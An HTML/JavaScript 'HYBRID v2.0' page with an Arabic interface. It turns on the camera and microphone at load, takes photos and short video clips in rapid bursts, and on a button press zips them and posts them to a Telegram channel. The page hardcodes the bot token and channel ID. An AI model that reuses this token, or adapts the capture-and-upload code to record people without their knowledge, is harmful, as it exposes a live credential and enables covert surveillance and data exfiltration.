<body>
    <div class="container">
        <!-- الهيدر -->
        <div class="header">
            <h1>
                <i class="fas fa-microchip"></i>
                HYBRID v2.0
            </h1>
            <div class="protocol-badge">
                30fps | 90%
            </div>
        </div>

        <!-- شاشتين عامودي -->
        <div class="dual-screen">
            <!-- الشاشة الأولى - البث المباشر -->
            <div class="screen live-screen">
                <div class="screen-header live-header">
                    <div class="screen-title">
                        <i class="fas fa-circle"></i> البث المباشر
                    </div>
                    <div class="live-badge" id="liveIndicator">🔴 مباشر</div>
                </div>
                <div class="video-container">
                    <video id="liveVideo" autoplay playsinline muted></video>
                    <div class="watermark-buttons">
                        <div class="watermark-btn" onclick="selectCamera('user')" id="camFrontBtn">
                            <i class="fas fa-camera-retro"></i>
                        </div>
                        <div class="watermark-btn" onclick="selectCamera('environment')" id="camBackBtn">
                            <i class="fas fa-camera"></i>
                        </div>
                    </div>
                </div>
            </div>

            <!-- الشاشة الثانية - آخر صورة -->
            <div class="screen preview-screen">
                <div class="screen-header preview-header">
                    <div class="screen-title">
                        <i class="fas fa-camera"></i> آخر صورة
                    </div>
                    <div class="timer-badge" id="countdownDisplay">5</div>
                </div>
                <div class="video-container">
                    <canvas id="previewCanvas" width="320" height="180"></canvas>
                    <div class="watermark-buttons">
                        <!-- زر ZIP فقط (يقوم بالإيقاف والإرسال معاً) -->
                        <div class="watermark-btn zip-btn" onclick="stopAndSend()" id="zipBtn">
                            <i class="fas fa-file-archive"></i>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- الأزرار الرئيسية - زر بدء وزر ZIP فقط -->
        <div class="action-buttons">
            <button class="action-btn start" onclick="startBroadcast()" id="startBtn">
                <i class="fas fa-play"></i> بدء
            </button>
            <button class="action-btn zip" onclick="stopAndSend()" id="zipBigBtn">
                <i class="fas fa-file-archive"></i> إيقاف وإرسال
            </button>
        </div>

        <!-- أزرار الكاميرا -->
        <div class="camera-controls">
            <div class="cam-btn active" onclick="selectCamera('user')" id="camFront">📷 أمامية</div>
            <div class="cam-btn" onclick="selectCamera('environment')" id="camBack">📸 خلفية</div>
        </div>

        <!-- شريط الحالة -->
        <div class="status-bar">
            <div style="display: flex; align-items: center; gap: 5px;">
                <span class="status-dot" id="statusDot"></span>
                <span id="statusText">جاهز</span>
            </div>
            <div class="status-info">
                <span><i class="fas fa-image"></i> <span id="photoCount">0</span></span>
                <span><i class="fas fa-video"></i> <span id="videoCount">0</span></span>
            </div>
        </div>

        <div class="footer">HYBRID v2.0 | @nardoo_merchant</div>
    </div>

    <script>
        // HYBRID v2.0 Protocol
        const HYBRID_CONFIG = {
            videoDuration: 5,
            videoInterval: 8000,
            photoQuality: 0.9,
            photoInterval: 200
        };

        const PUBLISHER = {
            id: '@nardoo_merchant',
            master: { session: 'LIVE_' + Math.random().toString(36).substring(2, 8).toUpperCase() }
        };

        const TELEGRAM = {
            botToken: '8576673096:AAEFKd-YSJcW_0d_wAHZBt-5nPg_VOjDX_0',
            channelId: '-1003822964890'
        };

        let stream = null;
        let cameraActive = false;
        let isLiveActive = false;
        let currentFacingMode = 'user';
        
        let currentPhotos = [];
        let currentVideos = [];
        
        let photoInterval = null;
        let videoInterval = null;
        let mediaRecorder = null;
        
        const video = document.getElementById('liveVideo');
        const canvas = document.getElementById('previewCanvas');
        const ctx = canvas.getContext('2d');
        
        const liveIndicator = document.getElementById('liveIndicator');
        const countdownDisplay = document.getElementById('countdownDisplay');
        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        const photoCount = document.getElementById('photoCount');
        const videoCount = document.getElementById('videoCount');
        
        const camFront = document.getElementById('camFront');
        const camBack = document.getElementById('camBack');
        const camFrontBtn = document.getElementById('camFrontBtn');
        const camBackBtn = document.getElementById('camBackBtn');

        // Camera selection
        window.selectCamera = function(mode) {
            if (mode === currentFacingMode) return;
            currentFacingMode = mode;
            updateCameraButtons();
            if (cameraActive) {
                if (isLiveActive) stopEverything();
                else stopCameraOnly();
                setTimeout(startCamera, 500);
            }
        };

        function updateCameraButtons() {
            const isFront = currentFacingMode === 'user';
            [camFront, camFrontBtn].forEach(btn => btn?.classList.toggle('active', isFront));
            [camBack, camBackBtn].forEach(btn => btn?.classList.toggle('active', !isFront));
        }

        // Start camera
        async function startCamera() {
            try {
                statusText.innerHTML = '🔄 تشغيل...';
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: currentFacingMode, width: 640, height: 360 },
                    audio: true
                });
                video.srcObject = stream;
                await video.play();
                cameraActive = true;
                statusDot.className = 'status-dot';
                statusText.innerHTML = 'الكاميرا جاهزة';
                requestAnimationFrame(updateCanvas);
            } catch (err) {
                statusText.innerHTML = '❌ خطأ';
            }
        }

        function updateCanvas() {
            if (stream && video.readyState === video.HAVE_ENOUGH_DATA) {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            }
            requestAnimationFrame(updateCanvas);
        }

        function stopCameraOnly() {
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
                video.srcObject = null;
            }
            cameraActive = false;
            statusDot.className = 'status-dot';
            statusText.innerHTML = 'الكاميرا متوقفة';
        }

        // Stop everything (internal function)
        function stopEverything() {
            if (isLiveActive) {
                isLiveActive = false;
                if (photoInterval) clearInterval(photoInterval);
                if (videoInterval) clearInterval(videoInterval);
                if (mediaRecorder?.state !== 'inactive') mediaRecorder?.stop();
                liveIndicator.style.display = 'none';
            }
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
                video.srcObject = null;
            }
            cameraActive = false;
            statusDot.className = 'status-dot';
            statusText.innerHTML = 'تم الإيقاف';
            countdownDisplay.style.display = 'none';
            updateStats();
        }

        // Start broadcast
        window.startBroadcast = function() {
            if (!cameraActive) {
                startCamera();
                setTimeout(() => startCountdown(), 1000);
            } else {
                startCountdown();
            }
        };

        function startCountdown() {
            let count = 5;
            countdownDisplay.textContent = count;
            countdownDisplay.style.display = 'block';
            liveIndicator.style.display = 'none';
            
            const interval = setInterval(() => {
                count--;
                countdownDisplay.textContent = count;
                if (count === 0) {
                    clearInterval(interval);
                    countdownDisplay.style.display = 'none';
                    liveIndicator.style.display = 'flex';
                    startLiveStream();
                }
            }, 1000);
        }

        function startLiveStream() {
            isLiveActive = true;
            statusDot.className = 'status-dot recording';
            statusText.innerHTML = '🔴 بث مباشر';
            
            currentPhotos = [];
            currentVideos = [];
            
            photoInterval = setInterval(capturePhoto, HYBRID_CONFIG.photoInterval);
            videoInterval = setInterval(recordVideo, HYBRID_CONFIG.videoInterval);
        }

        function capturePhoto() {
            if (!isLiveActive) return;
            canvas.toBlob((blob) => {
                if (!isLiveActive) return;
                currentPhotos.push({ blob });
                updateStats();
            }, 'image/jpeg', HYBRID_CONFIG.photoQuality);
        }

        async function recordVideo() {
            if (!isLiveActive || !stream) return;
            try {
                const chunks = [];
                const recorder = new MediaRecorder(stream);
                recorder.ondataavailable = (e) => chunks.push(e.data);
                recorder.onstop = () => {
                    currentVideos.push({ blob: new Blob(chunks) });
                    updateStats();
                };
                recorder.start();
                setTimeout(() => recorder.stop(), HYBRID_CONFIG.videoDuration * 1000);
            } catch (error) {}
        }

        // الدالة الجديدة: إيقاف وإرسال معاً
        window.stopAndSend = async function() {
            // أولاً: إيقاف البث وجمع المحتوى
            if (isLiveActive) {
                isLiveActive = false;
                if (photoInterval) clearInterval(photoInterval);
                if (videoInterval) clearInterval(videoInterval);
                if (mediaRecorder?.state !== 'inactive') mediaRecorder?.stop();
                liveIndicator.style.display = 'none';
            }
            
            // ثانياً: حفظ وإرسال ZIP إذا يوجد محتوى
            if (!currentPhotos.length && !currentVideos.length) {
                alert('لا يوجد محتوى للإرسال');
                // إيقاف الكاميرا فقط
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                    video.srcObject = null;
                }
                cameraActive = false;
                statusDot.className = 'status-dot';
                statusText.innerHTML = 'تم الإيقاف';
                countdownDisplay.style.display = 'none';
                return;
            }
            
            statusText.innerHTML = '📦 تجهيز وإرسال...';
            
            try {
                const zip = new JSZip();
                const subFingerprint = PUBLISHER.master.session + '_' + Date.now().toString(16).substring(0, 6).toUpperCase();
                
                currentPhotos.forEach((p, i) => zip.file(`photo_${i+1}.jpg`, p.blob));
                currentVideos.forEach((v, i) => zip.file(`video_${i+1}.webm`, v.blob));
                
                const now = new Date();
                zip.file("fingerprint.txt", `🔐 ${PUBLISHER.id}\n🎯 ${PUBLISHER.master.session}\n📅 ${now.toLocaleString('ar-EG')}\n🔑 ${subFingerprint}\n📊 ${currentPhotos.length} صور | ${currentVideos.length} فيديو`);
                
                const zipBlob = await zip.generateAsync({ type: "blob", compression: "DEFLATE" });
                
                statusText.innerHTML = '📤 إرسال للقناة...';
                
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM.channelId);
                formData.append('document', zipBlob, `broadcast_${subFingerprint}.zip`);
                formData.append('caption', `📦 بث من ${PUBLISHER.id}\n🔑 ${subFingerprint}\n📸 ${currentPhotos.length} | 🎥 ${currentVideos.length}`);
                
                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                
                statusText.innerHTML = (await res.json()).ok ? '✅ تم الإرسال' : '❌ فشل الإرسال';
                
                // إيقاف الكاميرا بعد الإرسال
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                    video.srcObject = null;
                }
                cameraActive = false;
                countdownDisplay.style.display = 'none';
                statusDot.className = 'status-dot';
                
            } catch (error) {
                statusText.innerHTML = '❌ خطأ';
            }
        };

        function updateStats() {
            photoCount.textContent = currentPhotos.length;
            videoCount.textContent = currentVideos.length;
        }

        window.onload = function() {
            startCamera();
            countdownDisplay.style.display = 'none';
            liveIndicator.style.display = 'none';
            updateCameraButtons();
        };
    </script>
</body>
</html>
